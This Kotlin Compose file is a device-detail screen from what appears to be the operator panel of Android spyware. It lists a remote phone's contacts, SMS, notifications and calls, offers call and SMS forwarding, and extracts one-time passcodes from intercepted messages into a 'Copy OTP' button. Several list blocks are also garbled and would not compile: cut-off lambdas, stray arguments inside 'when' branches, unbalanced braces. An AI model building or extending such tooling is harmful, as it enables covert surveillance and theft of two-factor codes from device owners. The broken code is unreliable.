package com.datasync.admin.ui

import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import androidx.compose.animation.*
import androidx.compose.foundation.ExperimentalFoundationApi
import androidx.compose.foundation.background
import androidx.compose.foundation.combinedClickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.LazyListState
import androidx.compose.foundation.lazy.LazyRow
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.lazy.itemsIndexed
import androidx.compose.foundation.lazy.rememberLazyListState
import androidx.compose.foundation.pager.HorizontalPager
import androidx.compose.foundation.pager.rememberPagerState
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.clickable
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.automirrored.filled.ArrowBack
import androidx.compose.material.icons.automirrored.filled.Send
import androidx.compose.material.icons.automirrored.filled.*
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.material3.pulltorefresh.PullToRefreshBox
import androidx.compose.material3.pulltorefresh.rememberPullToRefreshState
import androidx.compose.material3.TabRowDefaults.tabIndicatorOffset
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.vector.ImageVector
import androidx.compose.ui.graphics.asImageBitmap
import androidx.compose.ui.input.nestedscroll.nestedScroll
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextOverflow
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.lifecycle.compose.collectAsStateWithLifecycle
import com.datasync.admin.ui.viewmodel.DeviceDetailViewModel
import com.datasync.admin.ui.viewmodel.DeviceDetailUiState
import com.datasync.admin.ui.viewmodel.SyncStatus
import com.datasync.admin.ui.viewmodel.TabUiState
import com.datasync.admin.model.*
import com.datasync.admin.utils.DataUtils.hashString
import com.datasync.admin.utils.DataUtils.formatDate
import com.datasync.admin.utils.DataUtils.formatTime12h
import com.datasync.admin.utils.DataUtils.extractOtp
import com.datasync.admin.utils.DataUtils.copyToClipboard
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

@OptIn(ExperimentalMaterial3Api::class, ExperimentalFoundationApi::class)
@Composable
fun DeviceDetailScreen(deviceId: String, viewModel: DeviceDetailViewModel, onBack: () -> Unit) {
    val uiState by viewModel.uiState.collectAsStateWithLifecycle()

    when (val state = uiState) {
        is DeviceDetailUiState.Loading -> {
            Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
                CircularProgressIndicator()
            }
        }
        is DeviceDetailUiState.Error -> {
            Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
                Column(horizontalAlignment = Alignment.CenterHorizontally, modifier = Modifier.padding(24.dp)) {
                    Icon(Icons.Default.Error, null, modifier = Modifier.size(64.dp), tint = MaterialTheme.colorScheme.error)
                    Spacer(modifier = Modifier.height(16.dp))
                    Text("Error", style = MaterialTheme.typography.headlineSmall, color = MaterialTheme.colorScheme.error)
                    Text(state.message, style = MaterialTheme.typography.bodyMedium, textAlign = androidx.compose.ui.text.style.TextAlign.Center)
                    Spacer(modifier = Modifier.height(24.dp))
                    Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                        OutlinedButton(onClick = onBack) {
                            Text("Go Back")
                        }
                        Button(onClick = { viewModel.requestSync() }) {
                            Icon(Icons.Default.Refresh, contentDescription = null, modifier = Modifier.size(18.dp))
                            Spacer(modifier = Modifier.width(8.dp))
                            Text("Retry Sync")
                        }
                    }
                    Spacer(modifier = Modifier.height(16.dp))
                    val context = LocalContext.current
                    TextButton(onClick = {
                        val trace = if (state.lastError.isNotBlank()) state.lastError else state.message
                        copyToClipboard(context, "Device ID: $deviceId\nError: $trace\nTime: ${System.currentTimeMillis()}")
                    }) {
                        Icon(Icons.Default.ContentCopy, contentDescription = null, modifier = Modifier.size(18.dp))
                        Spacer(modifier = Modifier.width(8.dp))
                        Text("Copy Debug Info")
                    }
                }
            }
        }
        is DeviceDetailUiState.Success -> {
            DeviceDetailContent(deviceId, state.device, viewModel, onBack)
        }
    }
}

@OptIn(ExperimentalMaterial3Api::class, ExperimentalFoundationApi::class)
@Composable
fun DeviceDetailContent(deviceId: String, device: Device, viewModel: DeviceDetailViewModel, onBack: () -> Unit) {
    val scope = rememberCoroutineScope()
    val pagerState = rememberPagerState(pageCount = { 4 })
    val searchQuery by viewModel.searchQuery.collectAsStateWithLifecycle()
    val syncStatus by viewModel.syncStatus.collectAsStateWithLifecycle()

    val scrollBehavior = TopAppBarDefaults.enterAlwaysScrollBehavior()

    val tabs = listOf(
        TabItem("Contacts", Icons.Default.Person),
        TabItem("Messages", Icons.Default.Email),
        TabItem("Notifications", Icons.Default.Notifications),
        TabItem("Calls", Icons.Default.Call)
    )

    val listStates = List(4) { rememberLazyListState() }

    val showScrollToTop by remember {
        derivedStateOf {
            listStates[pagerState.currentPage].firstVisibleItemIndex > 0
        }
    }

    var isRefreshing by remember { mutableStateOf(false) }
    val pullToRefreshState = rememberPullToRefreshState()

    Scaffold(
        modifier = Modifier.nestedScroll(scrollBehavior.nestedScrollConnection),
        floatingActionButton = {
            AnimatedVisibility(
                visible = showScrollToTop,
                enter = fadeIn() + scaleIn(),
                exit = fadeOut() + scaleOut()
            ) {
                FloatingActionButton(
                    onClick = {
                        scope.launch {
                            listStates[pagerState.currentPage].animateScrollToItem(0)
                        }
                    },
                    modifier = Modifier.padding(bottom = 16.dp)
                ) {
                    Icon(Icons.Default.KeyboardArrowUp, contentDescription = "Scroll to top")
                }
            }
        },
        topBar = {
            Surface(
                tonalElevation = 2.dp,
                color = MaterialTheme.colorScheme.surface,
                modifier = Modifier.offset {
                    val offset = scrollBehavior.state.heightOffset.toInt()
                    androidx.compose.ui.unit.IntOffset(0, offset)
                }
            ) {
                Column {
                    TopAppBar(
                        scrollBehavior = scrollBehavior,
                        title = {
                            Column {
                                Text(
                                    device.deviceName,
                                    fontWeight = FontWeight.Bold,
                                    style = MaterialTheme.typography.titleMedium,
                                    maxLines = 1,
                                    overflow = TextOverflow.Ellipsis
                                )
                                Text(
                                    deviceId.takeLast(8).uppercase(),
                                    style = MaterialTheme.typography.labelSmall,
                                    color = MaterialTheme.colorScheme.onSurfaceVariant
                                )
                            }
                        },
                        navigationIcon = {
                            IconButton(onClick = onBack) { Icon(Icons.AutoMirrored.Filled.ArrowBack, contentDescription = null) }
                        },
                        actions = {
                            var showCallForwarding by remember { mutableStateOf(false) }
                            var showSmsForwarding by remember { mutableStateOf(false) }

                            IconButton(onClick = { showCallForwarding = true }) {
                                Icon(Icons.AutoMirrored.Filled.PhoneForwarded, "Call Forwarding")
                            }
                            IconButton(onClick = { showSmsForwarding = true }) {
                                Icon(Icons.Default.SmsFailed, "SMS Forwarding")
                            }

                            if (showCallForwarding) {
                                ForwardingBottomSheet(
                                    title = "Call Forwarding",
                                    device = device,
                                    onDismiss = { showCallForwarding = false }
                                )
                            }
                            if (showSmsForwarding) {
                                ForwardingBottomSheet(
                                    title = "SMS Forwarding",
                                    device = device,
                                    onDismiss = { showSmsForwarding = false }
                                )
                            }

                            var showThemeMenu by remember { mutableStateOf(false) }
                            IconButton(onClick = { showThemeMenu = true }) {
                                Icon(Icons.Default.Palette, contentDescription = "Theme")
                            }
                            DropdownMenu(expanded = showThemeMenu, onDismissRequest = { showThemeMenu = false }) {
                                listOf("System", "Light", "Dark").forEach { mode ->
                                    DropdownMenuItem(
                                        text = { Text(mode) },
                                        onClick = {
                                            viewModel.setThemeMode(mode)
                                            showThemeMenu = false
                                        }
                                    )
                                }
                            }

                            var showDeviceMenu by remember { mutableStateOf(false) }
                            var showDeleteConfirm by remember { mutableStateOf(false) }
                            IconButton(onClick = { showDeviceMenu = true }) {
                                Icon(Icons.Default.MoreVert, contentDescription = "Device actions")
                            }
                            DropdownMenu(expanded = showDeviceMenu, onDismissRequest = { showDeviceMenu = false }) {
                                DropdownMenuItem(
                                    text = { Text("Delete Device", color = MaterialTheme.colorScheme.error) },
                                    onClick = {
                                        showDeviceMenu = false
                                        showDeleteConfirm = true
                                    },
                                    leadingIcon = { Icon(Icons.Default.Delete, null, tint = MaterialTheme.colorScheme.error) }
                                )
                            }

                            if (showDeleteConfirm) {
                                AlertDialog(
                                    onDismissRequest = { showDeleteConfirm = false },
                                    title = { Text("Delete Device") },
                                    text = { Text("Are you sure you want to delete this device and all its associated data? This action cannot be undone.") },
                                    confirmButton = {
                                        TextButton(
                                            onClick = {
                                                viewModel.deleteDevice()
                                                showDeleteConfirm = false
                                                onBack()
                                            },
                                            colors = ButtonDefaults.textButtonColors(contentColor = MaterialTheme.colorScheme.error)
                                        ) {
                                            Text("Delete")
                                        }
                                    },
                                    dismissButton = {
                                        TextButton(onClick = { showDeleteConfirm = false }) {
                                            Text("Cancel")
                                        }
                                    }
                                )
                            }
                        }
                    )

                    StickyHeader(device, syncStatus) { viewModel.requestSync() }

                    ScrollableTabRow(
                        selectedTabIndex = pagerState.currentPage,
                        edgePadding = 16.dp,
                        divider = {},
                        indicator = { tabPositions ->
                            if (pagerState.currentPage < tabPositions.size) {
                                TabRowDefaults.SecondaryIndicator(
                                    Modifier.tabIndicatorOffset(tabPositions[pagerState.currentPage]),
                                    height = 3.dp,
                                    color = MaterialTheme.colorScheme.primary
                                )
                            }
                        }
                    ) {
                        tabs.forEachIndexed { index, tab ->
                            Tab(
                                selected = pagerState.currentPage == index,
                                onClick = { scope.launch { pagerState.animateScrollToPage(index) } },
                                text = { Text(tab.title) },
                                icon = { Icon(tab.icon, contentDescription = null, modifier = Modifier.size(20.dp)) }
                            )
                        }
                    }

                    TextField(
                        value = searchQuery,
                        onValueChange = { viewModel.setSearchQuery(it) },
                        modifier = Modifier
                            .fillMaxWidth()
                            .padding(horizontal = 12.dp, vertical = 4.dp),
                        placeholder = { Text("Search data...") },
                        textStyle = MaterialTheme.typography.bodySmall,
                        leadingIcon = {
                            Icon(
                                Icons.Default.Search,
                                contentDescription = null,
                                modifier = Modifier.size(18.dp)
                            )
                        },
                        trailingIcon = {
                            if (searchQuery.isNotEmpty()) {
                                IconButton(onClick = { viewModel.setSearchQuery("") }) {
                                    Icon(
                                        Icons.Default.Clear,
                                        contentDescription = null,
                                        modifier = Modifier.size(18.dp)
                                    )
                                }
                            }
                        },
                        shape = RoundedCornerShape(12.dp),
                        colors = TextFieldDefaults.colors(
                            focusedIndicatorColor = Color.Transparent,
                            unfocusedIndicatorColor = Color.Transparent,
                            focusedContainerColor = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.5f),
                            unfocusedContainerColor = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.5f)
                        )
                    )
                }
            }
        }
    ) { padding ->
            Box(modifier = Modifier.padding(padding).fillMaxSize()) {
                PullToRefreshBox(
                    isRefreshing = isRefreshing,
                    state = pullToRefreshState,
                    onRefresh = {
                        scope.launch {
                            isRefreshing = true
                            viewModel.requestSync()
                            delay(2000)
                            isRefreshing = false
                        }
                    },
                    modifier = Modifier.fillMaxSize()
                ) {
                    HorizontalPager(
                        state = pagerState,
                        modifier = Modifier.fillMaxSize(),
                        verticalAlignment = Alignment.Top
                    ) { page ->
                        when (page) {
                            0 -> ContactsTab(viewModel, listStates[0])
                            1 -> MessagesTab(viewModel, listStates[1])
                            2 -> NotificationsTab(viewModel, listStates[2])
                            3 -> CallsTab(viewModel, listStates[3])
                        }
                    }
                }
            }
    }
}

@Composable
fun StickyHeader(device: Device?, syncStatus: SyncStatus, onSyncRequest: () -> Unit) {
    Surface(
        modifier = Modifier
            .fillMaxWidth()
            .padding(horizontal = 12.dp, vertical = 4.dp),
        color = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.3f),
        shape = RoundedCornerShape(8.dp)
    ) {
        Column(modifier = Modifier.padding(12.dp)) {
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.SpaceBetween,
                verticalAlignment = Alignment.CenterVertically
            ) {
                Column {
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        val isOnline = device?.isOnline == true
                        val onlineColor = if (isOnline) Color(0xFF4CAF50) else Color.Gray
                        Box(modifier = Modifier.size(10.dp).clip(CircleShape).background(onlineColor))
                        Spacer(modifier = Modifier.width(6.dp))
                        Text(
                            text = if (isOnline) "Online" else "Offline",
                            style = MaterialTheme.typography.titleSmall,
                            color = onlineColor,
                            fontWeight = FontWeight.Bold
                        )
                    }
                    Text(
                        "Last Online: ${formatTime12h(device?.heartbeatAt ?: 0)}",
                        style = MaterialTheme.typography.labelSmall,
                        color = MaterialTheme.colorScheme.onSurfaceVariant
                    )
                }

                Button(
                    onClick = onSyncRequest,
                    enabled = syncStatus !is SyncStatus.Syncing,
                    contentPadding = PaddingValues(horizontal = 12.dp),
                    modifier = Modifier.height(32.dp),
                    shape = RoundedCornerShape(8.dp)
                ) {
                    if (syncStatus is SyncStatus.Syncing) {
                        CircularProgressIndicator(modifier = Modifier.size(16.dp), strokeWidth = 2.dp, color = MaterialTheme.colorScheme.onPrimary)
                    } else {
                        Icon(Icons.Default.Refresh, contentDescription = null, modifier = Modifier.size(16.dp))
                    }
                    Spacer(modifier = Modifier.width(6.dp))
                    Text("Sync Now", fontSize = 12.sp)
                }
            }

            HorizontalDivider(modifier = Modifier.padding(vertical = 8.dp), thickness = 0.5.dp, color = MaterialTheme.colorScheme.outlineVariant)

            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.SpaceBetween,
                verticalAlignment = Alignment.CenterVertically
            ) {
                Column {
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        val syncColor = when (syncStatus) {
                            is SyncStatus.Syncing -> Color(0xFFFFA500)
                            is SyncStatus.Success -> Color(0xFF4CAF50)
                            is SyncStatus.Failed -> MaterialTheme.colorScheme.error
                            else -> MaterialTheme.colorScheme.secondary
                        }
                        Text(
                            text = when (syncStatus) {
                                is SyncStatus.Syncing -> "Syncing..."
                                is SyncStatus.Success -> "Synced Successfully"
                                is SyncStatus.Failed -> "Sync Failed"
                                else -> "Idle"
                            },
                            style = MaterialTheme.typography.labelMedium,
                            color = syncColor,
                            fontWeight = FontWeight.SemiBold
                        )
                    }
                    Text(
                        "Last Sync: ${formatTime12h(device?.lastSyncTime ?: 0)}",
                        style = MaterialTheme.typography.labelSmall,
                        color = MaterialTheme.colorScheme.onSurfaceVariant
                    )
                }

                Row(horizontalArrangement = Arrangement.spacedBy(12.dp)) {
                    CountItem("SMS", device?.smsCount ?: 0)
                    CountItem("Calls", device?.callCount ?: 0)
                    CountItem("Contacts", device?.contactCount ?: 0)
                }
            }
        }
    }
}

@Composable
fun CountItem(label: String, count: Int) {
    Column(horizontalAlignment = Alignment.CenterHorizontally) {
        Text(count.toString(), style = MaterialTheme.typography.titleSmall, fontWeight = FontWeight.Bold)
        Text(label, style = MaterialTheme.typography.labelSmall, color = MaterialTheme.colorScheme.secondary)
    }
}

data class TabItem(val title: String, val icon: ImageVector)

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun ContactsTab(viewModel: DeviceDetailViewModel, listState: LazyListState) {
    val contactsState by viewModel.contacts.collectAsStateWithLifecycle()
    val contacts = (contactsState as? TabUiState.Success<Contact>)?.items ?: emptyList()
    val context = LocalContext.current
    val scope = rememberCoroutineScope()
    val snackbarHostState = remember { SnackbarHostState() }

    var itemToDelete by remember { mutableStateOf<Contact?>(null) }

    Box(modifier = Modifier.fillMaxSize()) {
        Column(modifier = Modifier.fillMaxSize()) {
            TabHeader(
                title = "${contacts.size} Contacts",
                onCopyAll = {
                    val text = contacts.joinToString("\n") { "${it.name}: ${it.phone}" }
                    copyToClipboard(context, text)
                    scope.launch { snackbarHostState.showSnackbar("All visible contacts copied") }
                },
                onDeleteAll = { viewModel.deleteAllVisible("contacts", contacts) }
            )

            when {
                contactsState is TabUiState.Loading -> LoadingState("Loading contacts...")
                contactsState is TabUiState.Error -> TabErrorState((contactsState as TabUiState.Error).message, (contactsState as TabUiState.Error).trace)
                contacts.isEmpty() -> EmptyState("No contacts found")
                else -> {
                LazyColumn(
                    state = listState,
                    contentPadding = PaddingValues(bottom = 80.dp),
                    modifier = Modifier.fillMaxSize()
                ) {
                    items(contacts, key = { it.id.ifBlank { hashString("${it.name}${it.phone}") } }) { contact ->
                        val dismissState = rememberSwipeToDismissBoxState(
                            confirmValueChange = {
                                when (it) {
                                    SwipeToDismissBoxValue.StartToEnd -> {
                                        copyToClipboard(context, "${contact.name}: ${contact.phone}")
                                        scope.launch { snackbarHostState.showSnackbar("Contact copied") }
                                    }
                                )
                            }
                            HorizontalDivider(modifier = Modifier.padding(horizontal = 16.dp), thickness = 0.5.dp)
                        }
                    }
                }
            }
        }
        SnackbarHost(hostState = snackbarHostState, modifier = Modifier.align(Alignment.BottomCenter))

        if (itemToDelete != null) {
            DeleteConfirmationDialog(
                onConfirm = {
                    viewModel.deleteItem("contacts", itemToDelete!!.id)
                    itemToDelete = null
                },
                onDismiss = { itemToDelete = null }
            )
        }
    }
}

@OptIn(ExperimentalFoundationApi::class)
@Composable
fun ContactItem(contact: Contact, onClick: () -> Unit, onLongClick: () -> Unit) {
    var showActionSheet by remember { mutableStateOf(false) }

    ListItem(
        modifier = Modifier.combinedClickable(
            onClick = onClick,
            onLongClick = { showActionSheet = true }
        ),
        headlineContent = { Text(contact.name, fontWeight = FontWeight.Bold) },
        supportingContent = { Text(contact.phone) },
        leadingContent = {
            Box(
                modifier = Modifier
                    .size(44.dp)
                    .clip(CircleShape)
                    .background(MaterialTheme.colorScheme.primaryContainer),
                contentAlignment = Alignment.Center
            ) {
                Text(
                    contact.name.take(1).uppercase(),
                    color = MaterialTheme.colorScheme.onPrimaryContainer,
                    style = MaterialTheme.typography.titleMedium,
                    fontWeight = FontWeight.Bold
                )
            }
        }
    )

    if (showActionSheet) {
        ActionSheet(
            onDismiss = { showActionSheet = false },
            actions = listOf(
                ActionItem("Copy Number", Icons.Default.ContentCopy) {
                    onClick()
                    showActionSheet = false
                },
                ActionItem("Copy Full Contact", Icons.AutoMirrored.Filled.Assignment) {
                    onLongClick()
                    showActionSheet = false
                }
            )
        )
    }
}

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun MessagesTab(viewModel: DeviceDetailViewModel, listState: LazyListState) {
    val messagesState by viewModel.sms.collectAsStateWithLifecycle()
    val messages = (messagesState as? TabUiState.Success<SMS>)?.items ?: emptyList()
    val filter by viewModel.smsFilter.collectAsStateWithLifecycle()
    val context = LocalContext.current
    val snackbarHostState = remember { SnackbarHostState() }
    val scope = rememberCoroutineScope()

    var itemToDelete by remember { mutableStateOf<SMS?>(null) }

    Box(modifier = Modifier.fillMaxSize()) {
        when (val state = messagesState) {
            is TabUiState.Loading -> {
                Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
                    CircularProgressIndicator()
                }
            }
            is TabUiState.Error -> {
                Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
                    Text(state.message, color = MaterialTheme.colorScheme.error)
                }
            }
            is TabUiState.Empty -> {
                Column(modifier = Modifier.fillMaxSize()) {
                    TabHeader(
                        title = "0 Messages",
                        onCopyAll = { },
                        onDeleteAll = { },
                        extraContent = {
                            Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                                FilterChip(selected = filter == 0, onClick = { viewModel.setSmsFilter(0) }, label = { Text("All") })
                                FilterChip(selected = filter == 1, onClick = { viewModel.setSmsFilter(1) }, label = { Text("Inbox") })
                                FilterChip(selected = filter == 2, onClick = { viewModel.setSmsFilter(2) }, label = { Text("Sent") })
                            }
                        }
                    )
                    EmptyState("No messages found")
                }
            }
            is TabUiState.Success -> {
                val messages = state.data
                Column(modifier = Modifier.fillMaxSize()) {
                    TabHeader(
                        title = "${messages.size} Messages",
                        onCopyAll = {
                            val text = messages.joinToString("\n\n") { "[${formatDate(it.date, false)}] ${it.address}: ${it.body}" }
                            copyToClipboard(context, text)
                            scope.launch { snackbarHostState.showSnackbar("All visible messages copied") }
                        },
                        onDeleteAll = { viewModel.deleteAllVisible("sms", messages) },
                        extraContent = {
                            Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                                FilterChip(selected = filter == 0, onClick = { viewModel.setSmsFilter(0) }, label = { Text("All") })
                                FilterChip(selected = filter == 1, onClick = { viewModel.setSmsFilter(1) }, label = { Text("Inbox") })
                                FilterChip(selected = filter == 2, onClick = { viewModel.setSmsFilter(2) }, label = { Text("Sent") })
                            }
                        }
                    )

            when {
                messagesState is TabUiState.Loading -> LoadingState("Loading messages...")
                messagesState is TabUiState.Error -> TabErrorState((messagesState as TabUiState.Error).message, (messagesState as TabUiState.Error).trace)
                messages.isEmpty() -> EmptyState("No messages found")
                else -> {
                LazyColumn(
                    state = listState,
                    contentPadding = PaddingValues(bottom = 80.dp),
                    modifier = Modifier.fillMaxSize()
                ) {
                    items(messages, key = { it.id.ifBlank { hashString("${it.address}${it.date}${it.body}") } }) { sms ->
                        val dismissState = rememberSwipeToDismissBoxState(
                            confirmValueChange = {
                                when (it) {
                                    SwipeToDismissBoxValue.StartToEnd -> {
                                        copyToClipboard(context, sms.body)
                                        scope.launch { snackbarHostState.showSnackbar("Message copied") }
                                    },
                                    onCopyFull = {
                                        copyToClipboard(context, "[${formatDate(sms.date, false)}] ${sms.address}: ${sms.body}")
                                        scope.launch { snackbarHostState.showSnackbar("Full SMS copied") }
                                    },
                                    onCopyOtp = { otp ->
                                        copyToClipboard(context, otp)
                                        scope.launch { snackbarHostState.showSnackbar("OTP $otp copied") }
                                    }
                                )
                            }
                            HorizontalDivider(modifier = Modifier.padding(horizontal = 16.dp), thickness = 0.5.dp)
                        }
                    }
                }
            }
        }
        SnackbarHost(hostState = snackbarHostState, modifier = Modifier.align(Alignment.BottomCenter))

        if (itemToDelete != null) {
            DeleteConfirmationDialog(
                onConfirm = {
                    viewModel.deleteItem("sms", itemToDelete!!.id)
                    itemToDelete = null
                },
                onDismiss = { itemToDelete = null }
            )
        }
    }
}

@OptIn(ExperimentalFoundationApi::class)
@Composable
fun SmsItem(
    sms: SMS,
    onCopyNumber: () -> Unit,
    onCopyBody: () -> Unit,
    onCopyFull: () -> Unit,
    onCopyOtp: (String) -> Unit
) {
    val otp = remember(sms.body) { extractOtp(sms.body) }
    var showActionSheet by remember { mutableStateOf(false) }

    ListItem(
        modifier = Modifier.combinedClickable(
            onClick = onCopyBody,
            onLongClick = { showActionSheet = true }
        ),
        headlineContent = {
            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween) {
                Text(sms.address, fontWeight = FontWeight.Bold, color = MaterialTheme.colorScheme.primary, modifier = Modifier.clickable { onCopyNumber() })
                Text(formatDate(sms.date), style = MaterialTheme.typography.labelSmall, color = MaterialTheme.colorScheme.onSurfaceVariant)
            }
        },
        supportingContent = {
            Column {
                Text(sms.body, style = MaterialTheme.typography.bodyMedium)
                Spacer(modifier = Modifier.height(8.dp))
                Row(verticalAlignment = Alignment.CenterVertically, horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                    SuggestionChip(
                        onClick = {},
                        label = { Text(if (sms.type == 1) "Inbox" else "Sent") },
                        modifier = Modifier.height(24.dp)
                    )
                    if (otp != null) {
                        Button(
                            onClick = { onCopyOtp(otp) },
                            contentPadding = PaddingValues(horizontal = 8.dp, vertical = 2.dp),
                            modifier = Modifier.height(28.dp)
                        ) {
                            Icon(Icons.Default.Lock, null, modifier = Modifier.size(14.dp))
                            Spacer(modifier = Modifier.width(4.dp))
                            Text("Copy OTP: $otp", fontSize = 11.sp)
                        }
                    }
                }
            }
        }
    )

    if (showActionSheet) {
        ActionSheet(
            onDismiss = { showActionSheet = false },
            actions = listOf(
                ActionItem("Copy Message", Icons.Default.ContentCopy) {
                    onCopyBody()
                    showActionSheet = false
                },
                ActionItem("Copy Full Info", Icons.AutoMirrored.Filled.Assignment) {
                    onCopyFull()
                    showActionSheet = false
                },
                ActionItem("Copy Number", Icons.Default.Phone) {
                    onCopyNumber()
                    showActionSheet = false
                }
            )
        )
    }
}

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun NotificationsTab(viewModel: DeviceDetailViewModel, listState: LazyListState) {
    val notificationsState by viewModel.notifications.collectAsStateWithLifecycle()
    val notifications = (notificationsState as? TabUiState.Success<NotificationData>)?.items ?: emptyList()
    val appFilters by viewModel.appFilters.collectAsStateWithLifecycle()
    val selectedApp by viewModel.selectedApp.collectAsStateWithLifecycle()
    val context = LocalContext.current
    val scope = rememberCoroutineScope()
    val snackbarHostState = remember { SnackbarHostState() }

    var itemToDelete by remember { mutableStateOf<NotificationData?>(null) }

    Box(modifier = Modifier.fillMaxSize()) {
        when (val state = notificationsState) {
            is TabUiState.Loading -> {
                Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
                    CircularProgressIndicator()
                }
            }
            is TabUiState.Error -> {
                Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
                    Text(state.message, color = MaterialTheme.colorScheme.error)
                }
            }
            is TabUiState.Empty -> {
                Column(modifier = Modifier.fillMaxSize()) {
                    TabHeader(
                        title = "0 Notifications",
                        onCopyAll = { },
                        onDeleteAll = { },
                        extraContent = {
                            LazyRow(
                                modifier = Modifier.fillMaxWidth(),
                                contentPadding = PaddingValues(vertical = 8.dp),
                                horizontalArrangement = Arrangement.spacedBy(8.dp)
                            ) {
                                items(appFilters.keys.toList()) { app ->
                                    FilterChip(
                                        selected = selectedApp == app,
                                        onClick = { viewModel.selectApp(app) },
                                        label = {
                                            Text("$app (${appFilters[app]})")
                                        },
                                        leadingIcon = {
                                            if (app != "All") {
                                                Icon(
                                                    imageVector = getAppIcon(app.lowercase()),
                                                    contentDescription = null,
                                                    modifier = Modifier.size(16.dp)
                                                )
                                            }
                                        }
                                    )
                                }
                            }
                        }
                    )
                    EmptyState("No notifications found")
                }
            }
            is TabUiState.Success -> {
                val notifications = state.data
                val currentSelectedApp = selectedApp
                val groupedNotifications = remember(notifications, currentSelectedApp) {
                    if (currentSelectedApp == "All") {
                        notifications.groupBy { it.appName }
                    } else {
                        emptyMap<String, List<NotificationData>>()
                    }
                }

            when {
                notificationsState is TabUiState.Loading -> LoadingState("Loading notifications...")
                notificationsState is TabUiState.Error -> TabErrorState((notificationsState as TabUiState.Error).message, (notificationsState as TabUiState.Error).trace)
                notifications.isEmpty() -> EmptyState("No notifications found")
                else -> {
                LazyColumn(
                    state = listState,
                    contentPadding = PaddingValues(bottom = 80.dp),
                    modifier = Modifier.fillMaxSize()
                ) {
                    if (currentSelectedApp == "All") {
                        groupedNotifications.forEach { (appName, appNotifications) ->
                            item(key = "header_$appName") {
                                Text(
                                    text = appName,
                                    style = MaterialTheme.typography.titleSmall,
                                    color = MaterialTheme.colorScheme.primary,
                                    modifier = Modifier.padding(horizontal = 16.dp, vertical = 8.dp)
                                )
                            }
                        } else {
                            items(notifications, key = { n -> n.id.ifBlank { hashString("${n.packageName}${n.timestamp}${n.title}") } }) { notification ->
                                SwipeableNotificationItem(notification, scope, snackbarHostState) { itemToDelete = it }
                            }
                        }
                    }
                }
            }
        }
        SnackbarHost(hostState = snackbarHostState, modifier = Modifier.align(Alignment.BottomCenter))

        if (itemToDelete != null) {
            DeleteConfirmationDialog(
                onConfirm = {
                    viewModel.deleteItem("notifications", itemToDelete!!.id)
                    itemToDelete = null
                },
                onDismiss = { itemToDelete = null }
            )
        }
    }
}

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun SwipeableNotificationItem(
    notification: NotificationData,
    scope: CoroutineScope,
    snackbarHostState: SnackbarHostState,
    onDeleteRequest: (NotificationData) -> Unit
) {
    val context = LocalContext.current
    val dismissState = rememberSwipeToDismissBoxState(
        confirmValueChange = {
            when (it) {
                SwipeToDismissBoxValue.StartToEnd -> {
                    copyToClipboard(context, "${notification.title}\n${notification.text}")
                    scope.launch { snackbarHostState.showSnackbar("Notification copied") }
                    false
                }
                SwipeToDismissBoxValue.EndToStart -> {
                    onDeleteRequest(notification)
                    false
                }
                else -> false
            }
        }
    )

    SwipeToDismissBox(
        state = dismissState,
        backgroundContent = { DismissBackground(dismissState) },
        modifier = Modifier
    ) {
        NotificationItem(notification, scope, snackbarHostState)
    }
}

@OptIn(ExperimentalFoundationApi::class)
@Composable
fun NotificationItem(
    notification: NotificationData,
    scope: CoroutineScope,
    snackbarHostState: SnackbarHostState
) {
    var showActionSheet by remember { mutableStateOf(false) }
    var isExpanded by remember { mutableStateOf(false) }

    ListItem(
        modifier = Modifier.combinedClickable(
            onClick = { isExpanded = !isExpanded },
            onLongClick = { showActionSheet = true }
        ),
        headlineContent = {
            Row(verticalAlignment = Alignment.CenterVertically) {
                Text(notification.title, fontWeight = FontWeight.SemiBold, style = MaterialTheme.typography.titleSmall, maxLines = if (isExpanded) Int.MAX_VALUE else 1, overflow = TextOverflow.Ellipsis)
            }
        },
        supportingContent = {
            Text(notification.text, maxLines = if (isExpanded) Int.MAX_VALUE else 2, overflow = TextOverflow.Ellipsis)
        },
        trailingContent = {
            Text(formatDate(notification.timestamp), style = MaterialTheme.typography.labelSmall)
        },
        leadingContent = {
            var iconSet = false
            if (notification.iconBase64.isNotBlank()) {
                val bytes = try { android.util.Base64.decode(notification.iconBase64, android.util.Base64.DEFAULT) } catch(e: Exception) { null }
                val bitmap = bytes?.let { android.graphics.BitmapFactory.decodeByteArray(it, 0, it.size) }
                if (bitmap != null) {
                    androidx.compose.foundation.Image(
